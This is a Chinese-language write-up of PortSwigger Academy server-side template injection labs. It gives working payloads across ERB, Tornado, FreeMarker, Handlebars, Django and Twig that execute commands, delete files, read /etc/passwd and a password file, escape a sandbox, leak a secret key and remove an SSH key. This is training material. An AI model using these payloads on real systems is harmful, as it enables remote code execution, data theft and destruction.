# Server-side template injection

## [Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
### 題目敘述
 This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

### 題目解釋
題目說是 ERB 的 SSTI


### 解答

```
https://acc21f1d1e22b8ffc0390b0f0087005f.web-security-academy.net/
?message=<%= 7 * 7 %>
```

會回傳 49


```
https://acc21f1d1e22b8ffc0390b0f0087005f.web-security-academy.net/
?message=<%= system("whoami") %>
```

可以取得使用者名稱

```
https://acc21f1d1e22b8ffc0390b0f0087005f.web-security-academy.net/
?message=<%= system("rm /home/carlos/morale.txt") %>
```

順利刪除檔案




## [Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
### 題目敘述
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
Tornado 的 SSTI，會修改使用者在留言頁面的名字

### 解答
觀察 POST 修改`Preferred name` 的參數 `blog-post-author-display`，預設是 `user.first_name`，修改成 `7*7` ，到貼文的留言處，例如 https://ac4c1ff91f021d3cc027040a00bc00f9.web-security-academy.net/post?postId=3 去留言，會發現名字變成 49。


改發
```
blog-post-author-display='meow'}}{{3*2}}
```

名字會變成

```
meow6}} 
```


再發
```
'meow'}}{% import os %}{{os.popen("whoami").read()}}
```

可以回傳使用者名字

```
meow'}}{% import os %}{{os.popen("rm /home/carlos/morale.txt").read()}}&
```

順利刪除指定檔案


## [Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
### 題目敘述
 This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r 
### 題目解釋
猜 Template 內容，然後在貼文的地方修改並 RCE 刪除指定檔案

### 解答

修改文章的地方可以觀察到

```
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
```

如果插入 `${7*7}` 會回傳 `49`


插入 `${aaa}` 會噴一堆 Java 的 Error

```
 FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> aaa [in template "freemarker" at line 1, column 3] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${aaa} [in template "freemarker" at line 1, column 1] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.visit(Environment.java:337) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:56) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:40) 
```

所以可以合理推論這是一個 Java 的 SSTI，還看到了關鍵字 FreeMaker


順利 RCE

```
${"freemarker.template.utility.Execute"?new()("whoami")}
```

刪除指定檔案
```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

## [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

### 題目敘述
 This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
### 題目解釋
猜 Template (Nodejs 的 handlebars)，然後 RCE

### 解答

點第一篇會跳成

```
https://acf81f5d1ecb3510c00024bd00d70072.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```


參數給 `{{7*7}}` 會噴錯

```
/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
            throw new Error(str);
            ^

Error: Parse error on line 1:
{{7*7}}
--^
Expecting &apos;ID&apos;, &apos;STRING&apos;, &apos;NUMBER&apos;, &apos;BOOLEAN&apos;, &apos;UNDEFINED&apos;, &apos;NULL&apos;, &apos;DATA&apos;, got &apos;INVALID&apos;
    at Parser.parseError (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
    at Parser.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30)
    at HandlebarsEnvironment.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at [eval]:5:13
    at ContextifyScript.Script.runInThisContext (vm.js:50:33)
    at Object.runInThisContext (vm.js:139:38)
    at Object.&lt;anonymous&gt; ([eval]-wrapper:6:22)
    at Module._compile (module.js:652:30)
```

可以看出是 JS handlebars 的 SSTI


把下面的 Exploit 轉 URLEncode 塞進去
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

就解了，ㄟ不是，不是說要刪檔案ㄇ，我還沒刪ㄟ

如果要刪的話就把上面的腳本的 `id` 改成 `rm /home/carlos/morale.txt` ㄅ


## [Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
### 題目敘述
 This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r 

### 題目解釋
要偷 framework 的 secret key

### 解答

修改文章的地方觀察到有出現 `{{product.stock}}`


如果讓他輸入 `{{type(product)}}` 會噴錯

```
Internal Server Error

Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '(product)' from 'type(product)' 
```

看得出是 Django 的 Error，而 Django 用 Jinja2，所以可以直接取 Secret key ，使用

```
{{settings.SECRET_KEY}}
```

就能偷出來ㄌ

## [Lab: Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
### 題目敘述
 This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r 

### 題目解釋
Java FreeMarker 沙盒逃逸 + 讀檔

### 解答

觀察修改貼的地方有出現 `${product.stock} `

如果只寫 `${product}` 會噴說是一個 `FreeMarkerProduct` 的物件


讀檔 Payload
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

可以讀出一段數字

```
 114 111 111 116 58 120 58 48 58 48 58 114 111 111 116 58 47 114 111 111 116 58 47 98 105 110 47 98 97 115 104 10 100 97 101 109 111 110 58 120 58 49 58 49 58 100 97 101 109 111 110 58 47 117 115 114 47 115 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 98 105 110 58 120 58 50 58 50 58 98 105 110 58 47 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 58 120 58 51 58 51 58 115 121 115 58 47 100 101 118 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 110 99 58 120 58 52 58 54 53 53 51 52 58 115 121 110 99 58 47 98 105 110 58 47 98 105 110 47 115 121 110 99 10 103 97 109 101 115 58 120 58 53 58 54 48 58 103 97 109 101 115 58 47 117 115 114 47 103 97 109 101 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 97 110 58 120 58 54 58 49 50 58 109 97 110 58 47 118 97 114 47 99 97 99 104 101 47 109 97 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 108 112 58 120 58 55 58 55 58 108 112 58 47 118 97 114 47 115 112 111 111 108 47 108 112 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 97 105 108 58 120 58 56 58 56 58 109 97 105 108 58 47 118 97 114 47 109 97 105 108 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 110 101 119 115 58 120 58 57 58 57 58 110 101 119 115 58 47 118 97 114 47 115 112 111 111 108 47 110 101 119 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 117 117 99 112 58 120 58 49 48 58 49 48 58 117 117 99 112 58 47 118 97 114 47 115 112 111 111 108 47 117 117 99 112 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 112 114 111 120 121 58 120 58 49 51 58 49 51 58 112 114 111 120 121 58 47 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 119 119 119 45 100 97 116 97 58 120 58 51 51 58 51 51 58 119 119 119 45 100 97 116 97 58 47 118 97 114 47 119 119 119 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 98 97 99 107 117 112 58 120 58 51 52 58 51 52 58 98 97 99 107 117 112 58 47 118 97 114 47 98 97 99 107 117 112 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 108 105 115 116 58 120 58 51 56 58 51 56 58 77 97 105 108 105 110 103 32 76 105 115 116 32 77 97 110 97 103 101 114 58 47 118 97 114 47 108 105 115 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 105 114 99 58 120 58 51 57 58 51 57 58 105 114 99 100 58 47 118 97 114 47 114 117 110 47 105 114 99 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 103 110 97 116 115 58 120 58 52 49 58 52 49 58 71 110 97 116 115 32 66 117 103 45 82 101 112 111 114 116 105 110 103 32 83 121 115 116 101 109 32 40 97 100 109 105 110 41 58 47 118 97 114 47 108 105 98 47 103 110 97 116 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 110 111 98 111 100 121 58 120 58 54 53 53 51 52 58 54 53 53 51 52 58 110 111 98 111 100 121 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 95 97 112 116 58 120 58 49 48 48 58 54 53 53 51 52 58 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 112 101 116 101 114 58 120 58 49 50 48 48 49 58 49 50 48 48 49 58 58 47 104 111 109 101 47 112 101 116 101 114 58 47 98 105 110 47 98 97 115 104 10 99 97 114 108 111 115 58 120 58 49 50 48 48 50 58 49 50 48 48 50 58 58 47 104 111 109 101 47 99 97 114 108 111 115 58 47 98 105 110 47 98 97 115 104 10 117 115 101 114 58 120 58 49 50 48 48 48 58 49 50 48 48 48 58 58 47 104 111 109 101 47 117 115 101 114 58 47 98 105 110 47 98 97 115 104 10 101 108 109 101 114 58 120 58 49 50 48 57 57 58 49 50 48 57 57 58 58 47 104 111 109 101 47 101 108 109 101 114 58 47 98 105 110 47 98 97 115 104 10 97 99 97 100 101 109 121 58 120 58 49 48 48 48 48 58 49 48 48 48 48 58 58 47 97 99 97 100 101 109 121 58 47 98 105 110 47 98 97 115 104 10 100 110 115 109 97 115 113 58 120 58 49 48 49 58 54 53 53 51 52 58 100 110 115 109 97 115 113 44 44 44 58 47 118 97 114 47 108 105 98 47 109 105 115 99 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 101 115 115 97 103 101 98 117 115 58 120 58 49 48 50 58 49 48 49 58 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 
```

丟 [Cyberchef](https://gchq.github.io/CyberChef) 選 From Decimal 就能還原


```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

吐出

```
108 118 108 100 120 111 107 52 119 121 109 121 116 117 102 109 120 103 120 117
```

再轉一下就出來答案ㄌ

## [Lab: Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)
### 題目敘述
 This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋

### 解答
看樣子是打留言的，跟剛剛第二題一樣

`'meow'}}{{7*7}}` 可以噴 `meow49}}`


但輸入
```
{% import os %}{{os.popen("whoami").read()}}
```
會噴錯

```


Internal Server Error

PHP Fatal error: Uncaught Twig_Error_Syntax: Unexpected token "end of statement block" of value "" ("text" expected) in "index" at line 1. in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/TokenStream.php:80 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/TokenParser/Import.php(24): Twig_TokenStream->expect('as') #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(168): Twig_TokenParser_Import->parse(Object(Twig_Token)) #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(81): Twig_Parser->subparse(NULL, false) #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(533): Twig_Parser->parse(Object(Twig_TokenStream)) #4 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(565): Twig_Environment->parse(Object(Twig_TokenStream)) #5 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(368): Twig_Environment->compileSource(Object(Twig_Source)) #6 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twi in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/TokenStream.php on line 80 
```

看起來是 PHP 的 Twig

如果在上傳大頭貼的地方傳垃圾 (例如文字檔)，會噴錯

```
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/x-php in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/s.php', 'application/x-p...')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

可以看出使用者有一個 `setAvatar` 的函數

合理懷疑這邊的 User 物件就是預設 `blog-post-author-display` 參數中 `user.name` 的 `user`


所以先試著送參數

```
blog-post-author-display=user.name}}{{user.setAvatar('/etc/passwd','text/plain')}}
```

發現噴錯

```
Internal Server Error

PHP Fatal error: Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Extension/Core.php(1601): User->setAvatar('/etc/passwd', 'text/plain') #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(378) : eval()'d code(24): twig_get_attribute(Object(Twig_Environment), Object(Twig_Source), Object(User), 'setAvatar', Array, 'method') #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(394): __TwigTemplate_ca342760361a050b37bd958bf359a490e3a6f8c9e58e5d9e15aafcc36b16963c->doDisplay(Array, Array) #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(371): Twig_Template->displayWithErrorHandling(Array, Array) #4 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(379): Twig_Template->display(Array) #5 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(289): Twig_Template->render(Array) #6 Command line code(10): Twig_ in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php on line 409 
```


所以我們要把 content-type 設定成圖片，再次訪問留言區讓他執行

```
blog-post-author-display=user.name}}{{user.setAvatar('/etc/passwd','image/jpg')}}
```

接下來再來看使用者的照片
https://ac6f1f271e530629c0ca147c00ad0026.web-security-academy.net/avatar?avatar=wiener

就會發現成功讀到了 `/etc/passwd`

那這樣就代表我們可以任意讀檔，來讀一下程式的原始碼 `/home/carlos/User.php`

```
blog-post-author-display=user.name}}{{user.setAvatar('/home/carlos/User.php','image/jpeg')}}&csrf=E6m0Ds6W8YnITVvSyn5ySx98cNN49m0I
```

```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?> 
```

發現程式碼裡面有一個 `gdprDelete` 可以把東西都刪掉，因此我們可以先把使用者的檔案給 Link 上去之後，再刪掉


```
blog-post-author-display=user.name}}{{user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')}}
```

可以順利的把檔案給連上去，此時可以發現 `id_rsa` 裡面的東西是 `Nothing to see here :)`

接下來執行 `gdprDelete`

```
blog-post-author-display=user.name}}{{user.gdprDelete()}}
```

就過關了